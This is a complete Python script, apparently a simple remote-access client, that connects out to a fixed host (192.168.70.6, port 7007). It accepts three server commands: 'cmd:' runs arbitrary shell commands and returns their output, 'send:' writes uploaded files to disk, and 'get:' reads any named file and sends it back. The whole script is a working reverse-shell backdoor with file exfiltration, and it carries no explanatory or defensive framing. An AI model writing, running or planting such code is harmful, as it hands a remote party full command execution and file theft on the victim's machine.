import socket
import subprocess
from pathlib import Path

def tcp_client():
    print("client starting")
    client_socket = socket.socket()

    try:
        server_address = ("192.168.70.6", 7007)
        client_socket.connect(server_address)
        print("connected")

        while True:
            header = client_socket.recv(1024).decode("utf-8").strip()

            if header.startswith("cmd:"):
                _, command = header.split(":")
                print(command)
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                message = f"Command: {command}, Output: {output}"
                print(message)
                client_socket.sendall(message.encode("utf-8"))

            elif header.startswith("send:"):
                _, filename, filesize = header.split(":")
                filesize = int(filesize)

                file_data = b""
                while len(file_data) < filesize:
                    chunk = client_socket.recv(4096)
                    if not chunk:
                        break
                    file_data += chunk

                with open(filename, 'wb') as f:
                    f.write(file_data)
                message = f"File received: {filename}"
                print(message)
                client_socket.sendall(message.encode("utf-8"))

            elif header.startswith("get:"):
                _, filename = header.split(":")
                file = Path(filename)
                filesize = file.stat().st_size
                header = f"get:{filename}:{filesize}\n"
                client_socket.sendall(header.encode("utf-8"))
                try:
                    with open(filename, "rb") as f:
                        file_data = f.read()
                except Exception as e:
                    print(f"Error: {e}")

                if file_data:
                    client_socket.sendall(file_data)
                    print("File read complete")
                print("get")
                message = "get"



    except socket.error as err:
        print(f"Error: {err}")
    except KeyboardInterrupt:
        print("Disconnecting")
    finally:
        client_socket.close()

if __name__ == "__main__":
    tcp_client()